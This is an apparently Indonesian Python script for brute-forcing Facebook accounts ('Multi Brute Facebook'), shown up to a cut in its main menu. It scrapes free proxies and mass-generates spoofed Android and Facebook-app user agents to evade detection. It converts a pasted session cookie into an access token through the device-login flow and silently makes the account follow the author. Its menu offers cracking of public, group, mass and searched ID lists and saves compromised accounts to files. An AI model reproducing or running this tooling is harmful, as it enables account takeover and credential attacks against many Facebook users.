import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid,calendar
#------------------[  MODULE  ]-------------------#
try:
    import licensing
except ImportError:
    print('• Sedang Menginstall Modul licensing •')
    os.system('pip install licensing')
try:
        import rich
except ImportError:
        print('• Sedang Menginstall Modul Rich •')
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        print('• Sedang Menginstall Modul stdiomask •')
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	print('• Sedang Menginstall Modul requests •')
	os.system('pip install requests && pip install mechanize ')
#------------------[ IMPORT MODULE ]-------------------#
from time import sleep
from datetime import date,datetime
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from licensing.models import *
from licensing.methods import Key, Helpers

#------------------[ GLOBAL NAME ]-------------------#
sekarang = calendar.timegm(time.gmtime(time.time()))
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
uidl =[]
opsi=[]
uidf=[]
liu=[]
ugent = []
licenseKey=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2; BMBF | Multi Brute Facebook\x07')

def __init__(self):
    men = []
    id = []
    ip = ses.get("http://ip-api.com/json/").json()["query"]
    negara = ses.get("http://ip-api.com/json/").json()["country"]
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda');exit()
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='Redmi 4A Build/MMB29M; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 hola_android'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	

#------------[ UBAH UA DIH SINI OM ]---------------#
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    merek = random.choice(['SM-A405FN','SM-A346M','SM-J415FN','SM-X706B','SM-J337R4','SM-A9000','SM-G532G','SM-J810M','SM-T280'])
    build = random.choice(['LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD'])
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.{str(rr(0,4))} Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,12))}.{str(rr(1,9))}.{str(rr(1,9))}like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile/14G60 Safari/604.1"
    UaMainn = random.choice([u1, u2, u3])
    ugen.append(UaMainn)

for memekx in range(200):
	android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
	fbav = str(random.randint(37,325))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
	fbbv = str(random.randint(11111111,99999999));fbrv = str(random.randint(11111111,99999999))
	build2 = ['OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016']
	merk2 = ['Lenovo TB2-X30L','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2']
	fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata']))
	fblc = str(random.choice(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID']))
	fbpn = str(random.choice(['com.facebook.katana','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.mlite','MessengerLite']))
	merk_build = str(random.choice(merk2))+'<=>'+str(random.choice(build2));merks,build2 = merk_build.split('<=>')
	large = str(random.choice(['1.0','1.5','2.0','2.5','3.0','3.5']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']));denincity,width,heigt = large.split('<=>')      
	dalvik = str(random.choice(['2.1.0','2.0.0','1.6.0','1.5.0','1.4.0','1.2.0','1.1.0']))
	ua1 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; vivo 1612 Build/NRD90M) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/vivo;FBBD/vivo;FBDV/vivo 1612;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua2 = 'Dalvik/'+str(dalvik)+' (Linux; U; Android '+str(android)+'; '+str(merks)+' Build/'+str(build2)+') [FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBDV/merek;FBSV/'+str(android)+';FBDM/{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua3 = 'Dalvik/2.1.0 (Linux; U; Android '+str(android)+'; Redmi 5A Build/'+str(build2)+') [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 5A;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	api = str(rc([ua1,ua2,ua3]))
	liu.append(api)

for z in range(200):
	versi_android = str(random.randint(4,12))+".0.1"
	rr = random.randint
	rc = random.choice
	xio = str(random.randint(4,12))+".0.0"
	android = str(random.randint(4,12))
	versi_chrome = str(random.randint(111,555))+".0.0."+str(random.randint(10,30))+"."+str(random.randint(10,150))
	device_oppo = random.choice(["CPH1723", "CPH1901","CPH1920", "CPH1933", "CPH1937","CPH1937", "CPH1945", "CPH1951", "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003", "CPH2004","CPH2269"])
	device_vivo = random.choice(["vivo 1917", "vivo 1915", "vivo 1911", "vivo 1933", "vivo 1912","vivo 1920", "vivo 1921", "vivo 1910", "vivo 1927", "vivo 1913", "vivo 1923", "vivo 1926", "vivo 1928", "vivo 1931", "vivo 1935"])
	device_samsung = random.choice(["SM-G975F","SM-G532G","SM-N975F","SM-G988U","SM-G977U","SM-A705FN","SM-A515U1","SM-G955F","SM-A750G","SM-N960F","SM-G960U","SM-J600F","SM-A908B","SM-A705GM","SM-G970U","SM-A307FN","SM-G965U1","SM-A217F","SM-G986B","SM-A207M","SM-A515W","SM-A505G","SM-A315G","SM-A507FN","SM-A505U1","SM-G977T","SM-A025G","SM-J320F","SM-A715W","SM-A908N","SM-A205F","SM-G988B","SM-N986B","SM-A715F","SM-A515F","SM-G965F","SM-G960F","SM-A505F","SM-A207F","SM-A307G","SM-G970F","SM-A107F","SM-G935F","SM-G935A","SM-A310F","SM-J320FN"])
	device_xiaomi = random.choice(["Mi 11 Lite 5G  stable","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G"])
	device_sony = random.choice(["E6653"," G8231","C6603"," D6503","SO-05F","SGP612","802SO","J9110","SOV40","SO-51A","XQ-AT51"," SOG01","SO51Aa","XQ-AT42","SO-51B","XQ-BC52","XQ-BC62","XQ-BC72","SOG03","J9150","I4113","I3113","I3123","I3113","901SO","J3273","XQ-CC72","XQ-BT44","SO-41B"," C2304","E5506","G3311"," C1905","D5322"])
	device_google = random.choice(["Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel C","Pixel 5a","Pixel 2 XL","Pixel 2","Pixel Slate","Google Pixelbook Go","Google Pixelbook Go","Pixel XL","Pixel 3a"])
	device_realme = random.choice(["RMX1831","RMX1911","RMX1971","RMX2030","RMX2076","RMX2081","RMX2151","RMX2176","RMX2185","RMX2193","RMX2194","RMX2195","RMX3061","RMX3017","RMX3042","RMX1231"])
	h_sony = random.choice(["A","B","C"])
	dev = device_oppo.split(" Build/")[0]
	density = random.choice(["{density=3.0,width=720,height=1280};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=2.75,width=1080,height=2028};FB_FW/1;]"])
	jkj = str(random.randint(11111111,99999999))
	jka = str(random.randint(200600,200999))
	jkb = str(random.randint(4,13))
	jkc = str(random.randint(20000000,99999999))
	opk = random.choice(["com.facebook.katana","com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.mlite"])
	oph = random.choice(["Katana-Android","Adsmanager-Android","Facebook.lite-Android","Orca-Android","Facebook.mlite-Android"])
	mco = random.choice(["en_GB","en_US","es_MX","th_TH","pl_PL"])
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	build = f"{random.choice(az)}{random.choice(az)}{random.randint(10,90)}{random.choice(az)}"
	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
	ua_v = f"Mozilla/5.0 (Linux; Android {xio}; {device_vivo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(3400,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(200,700))}.0.0.{str(rr(10,30))}.{str(rr(30,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/vivo;FBBD/vivo;FBDV/{device_vivo};FBSV/{versi_android};FBOP/16]"
	ua_s = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(5000,5999))}.{str(rr(10,100))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(700,999))}.0.0.{str(rr(100,200))}.{str(rr(200,350))};]"
	ua_o = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/oppo;FBBD/oppo;FBDV/{device_oppo};FBSV/{versi_android};FBOP/18]"
	ua_r = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_realme}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4400,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/Realme;FBBD/Realme;FBDV/{device_realme};FBSV/{versi_android};FBOP/19]"
	ua_d = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung} Build/TP1A.{str(rr(220000,229999))}.0{str(rr(1,30))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,130))}.0.{str(rr(5000,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(90,600))}.0.0.{str(rr(1,30))}.{str(rr(100,150))};]"
	ua_x = f"Mozilla/5.0 (Linux; Android {android}; {device_xiaomi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB;FBAV/{str(rr(300,600))}.0.0.{str(rr(10,90))}.{str(rr(100,150))};FBBV/{str(rr(200000000,299999999))};WV;FBDM/"+"{density=3.0,width=1080,height=2133};FBLC/en_US;FBRV/250292151;]"
	ua = str(rc([ua_d,ua_s,ua_v,ua_r,ua_o,ua_x]))
	if ua_s in ugent:pass
	else:ugent.append(ua_s)


for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('__ua.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Rudal-XD/HACK-FB/blob/main/bbnew.txt').text
		ua=open('__ua.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('__ua.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00FF00]"
	W1 = random.choice([M2,H2,K2])
	W2 = random.choice([K2,M2,K2])
	W3 = random.choice([H2,K2,M2])
	color_panel = "#00FF00"
	color_ok = "#00FF00"
	color_cp = "#FFFF00"
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
    Console().print(Panel("""
[bold red]███████████████████████             
[bold red]███████████████████████          [bold yellow]Github    : [bold green]https://github.com/Rudal-XD
[bold red]███████████████████████          [bold yellow]Wa        : [bold green]+62895386194***
[bold white]███████████████████████          
[bold white]███████████████████████          
[bold white]███████████████████████ 
[bold white]""",width=80,style=f"{color_panel}"))
    
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
	Console().print(Panel("""[bold white][[bold cyan]01[bold white]] Login Menggunakan Cookie\n[[bold cyan]02[bold white]] Keluar
    """,width=80, style=f"{color_panel}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (LOGIN) [bold green]<[bold yellow]<[bold red]<"))
	bryn = console.input(f" {H2}• {P2}pilih menu : ")
	if bryn in ['1','01']:
		login_lagi334()
	elif bryn in ['2','02']:
		exit()
	else:
		Console().print("[bold cyan]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r')
		time.sleep(5)
		login()
		
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			Console().print("[bold cyan]   ╰─>[bold red] Problem Internet Connection, Check And Try Again")
			exit()
	except IOError:
		login123()
		
def login_lagi334():
    try:
        Console().print(Panel("""[bold white]Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account""",width=80,style=f"{color_panel}", title="SARAN"))
        your_cookies = console.input(f" {H2}• {P2}Masukan Cookie : ")
        with requests.Session() as r:
            try:
                r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
                data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
                response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
                code, user_code = response['code'], response['user_code']
                verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
                r.headers.pop('content-type')
                r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
                response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
                if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
                    print(" [+] Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
                else:
                    action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
                    fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
                    data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
                    r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
                    response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
                    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                        r.headers.pop('content-type');r.headers.pop('origin')
                        response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
                        action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
                        fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
                        jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
                        scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
                        display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
                        user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
                        logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
                        auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
                        encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
                        return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
                        r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
                        data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
                        response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
                        windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
                        r.headers.pop('content-type');r.headers.pop('origin')
                        r.headers.update({'referer': 'https://m.facebook.com/',})
                        response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
                        if 'Sukses!' in str(response6):
                            r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
                            response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
                            access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
                            Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{access_token}""",width=80, style=f"{color_panel}", title="[bold green]>[hot_pink2] (PILIHAN) [bold green]<"))
                            tokenew = open(".token.txt","w").write(access_token)
                            cook= open(".cok.txt","w").write(your_cookies)
                            Console().print("[bold cyan]   ╰─> [bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]");time.sleep(5);followdong()
                            time.sleep(3)
                            back()

            except Exception as e:
                Console().print(f"[bold cyan]   ╰─>[bold red] Cookies Mokad Bang")
                os.system('rm -rf .token.txt && rm -rf .cok.txt')
                print(e)
                time.sleep(3)
                exit()
    except:pass

def followdong():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		Console().print("[bold cyan]   ╰─>[bold red] Cookies Kadaluarsa ")
		time.sleep(5)
		login()
	myuid = ('100043537611609')
	try:
		for foll in parser(requests.get(f'https://mbasic.facebook.com/'+myuid,cookies={'cookie':cokies}).text,'html.parser').find_all('a',href=True):
			if '/a/subscribe.php?' in foll.get('href'):
				x=requests.get('https://mbasic.facebook.com'+foll['href'],cookies = {'cookie':cokies}).text
				exit()
	except(Exception)as e:print(e)#< Response error
	
#----------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
    try:
        token = open('.token.txt','r').read()
        cookie = open('.cok.txt','r').read()
    except IOError:
        Console().print("[bold cyan]   ╰─>[bold red] Cookies Kadaluarsa ")
        time.sleep(3)
        login()
    os.system('clear')
    banner()
    negara = requests.get("http://ip-api.com/json/").json()["country"]
    ip = requests.get("http://ip-api.com/json/").json()["query"]
    prints(Panel(f"{P2}{ip}",padding=(0,30),title=f"{H2}{my_name}",subtitle=f"{H2}{negara}",style=f"{color_panel}"))
    prints(Panel(f"""{P2}
[{color_text}01{P2}]. crack dari id publik   [{color_text}05{P2}]. crack dari pencarian nama
[{color_text}02{P2}]. crack dari id Masal    [{color_text}06{P2}]. Dump ID Publik
[{color_text}03{P2}]. crack dari id Group    [{color_text}07{P2}]. crack dari File
[{color_text}04{P2}]. crack dari random mail [{color_text}08{P2}]. crack dari opsi CP""",width=80,padding=(0,6),style=f"{color_panel}"))
    prints(Panel(f"""{P2}ketik {H2}bot{P2} untuk ke menu bot dan ketik {H2}lain{P2} untuk ke menu lain""",width=80,padding=(0,6),style=f"{color_panel}"))
    HaHi = console.input(f" {H2}• {P2}pilih menu : ")
    if HaHi in ['']:
        print(f" {H2}• [bold red]Masukan Yang Bener Tolol!!! ")
    elif HaHi in ['1','01']:
        publik()
    elif HaHi in ['2','02']:
        massal()
    elif HaHi in ['3','03']:
        crack_group()
    elif HaHi in ['4','04']:
        prints(Panel(f"""{P2}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"{color_panel}"))
        user = console.input(f" {H2}• {P2}masukan nama : ")
        format = console.input(f" {H2}• {P2}masukan format : ")
        limit = console.input(f" {H2}• {P2}masukan limit : ")
        Dump_Email(user,format,limit)
        setting()
    elif HaHi in ['5','05']:
        prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=80,style=f"{color_panel}"))
        user = console.input(f" {H2}• {P2}masukan nama : ")
        common = open("asset/nama_indonesia","r").read().splitlines()
        for idt in user.split(","):
            id.append(idt)
            for people in common:
                id.append(people+" "+idt)
                try:
                    for gas in id:
                        Dump_Pencarian(f"https://mbasic.facebook.com/public/{gas}")
                except:pass
                setting()
    elif HaHi in ['6','06']:
        publikv2()
    elif HaHi in ["7","07"]:
        crack_file()
    elif HaHi in ["8","08"]:
        file_cp()
    
    ###----------[ PINDAH KE MENU BOT ]---------- ###
    elif HaHi in["BOT","Bot","bot"]:
